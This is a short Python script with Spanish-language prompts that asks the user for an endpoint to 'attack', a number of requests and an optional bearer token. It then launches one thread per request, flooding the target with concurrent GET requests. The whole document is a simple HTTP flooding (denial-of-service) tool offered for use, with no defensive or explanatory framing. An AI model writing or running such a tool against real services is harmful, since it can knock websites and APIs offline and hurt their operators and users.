import requests
import threading

def get_data(link: str, token: str=""):
    response = requests.get(link,headers={  "Authorization": "Bearer " + token  })
    print(response.status_code)
    return response.status_code

def main(): 
    link = str(input("Link/endpoint que desea atacar: "))
    repeat_times = int(input("Cuantas peticiones desea hacer: "))
    token = str(input("Debe tener algún token (Opcionarl): "))
    count = 0

    while repeat_times >= count:
        new_thread = threading.Thread(target=get_data, args=(link, token), )
        new_thread.start()
        count += 1
        print(count)

    print("Completed")
    exit(1)

if __name__ == "__main__": 
    main()